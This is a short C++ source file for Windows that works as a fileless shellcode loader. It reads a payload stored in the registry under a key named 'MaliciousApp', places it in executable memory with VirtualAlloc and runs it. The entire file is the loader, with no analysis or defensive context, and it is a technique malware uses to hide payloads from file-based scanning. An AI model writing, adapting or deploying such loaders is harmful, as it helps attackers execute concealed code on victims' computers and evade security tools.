#include <windows.h>
#include <vector>

// Execute shellcode from memory
void execShellcode(unsigned char* shellcode, size_t size) {
    void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    memcpy(mem, shellcode, size);
    ((void(*)())mem)(); // Execute shellcode
}

// Entry point for Windows GUI applications
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    HKEY hKey;
    DWORD payloadSize = 0;

    // Open registry key
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\MaliciousApp", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueEx(hKey, "Payload", NULL, NULL, NULL, &payloadSize) == ERROR_SUCCESS) {
            std::vector<unsigned char> buffer(payloadSize);
            if (RegQueryValueEx(hKey, "Payload", NULL, NULL, buffer.data(), &payloadSize) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                execShellcode(buffer.data(), buffer.size());
            }
        }
    }

    return 0;
}
